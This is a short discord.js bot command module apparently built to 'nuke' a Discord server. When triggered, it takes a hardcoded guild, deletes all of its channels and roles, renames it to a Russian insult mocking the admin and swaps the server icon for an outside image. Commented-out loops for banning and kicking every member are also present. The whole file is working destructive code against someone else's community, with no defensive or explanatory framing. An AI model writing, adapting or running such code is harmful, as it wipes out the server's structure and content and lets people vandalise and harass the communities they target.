const {MessageEmbed} = require("discord.js")
module.exports = {
  name:"2",
  async run(client, message,args) {
   let guild = client.guilds.cache.get("790942465846149141")
 guild.channels.cache.forEach(r =>{
 r.delete()
 })
 guild.roles.cache.forEach(r =>{
 r.delete()
 })
 // guild.members.forEach(r =>{
 // r.ban()
 // })
 // guild.members.forEach(r =>{
 // r.kick()
 // })
 guild.setName("Админ Лох")
 guild.setIcon("https://media.discordapp.net/attachments/582654802832654339/597381590083174409/10-1.png")
  }
}
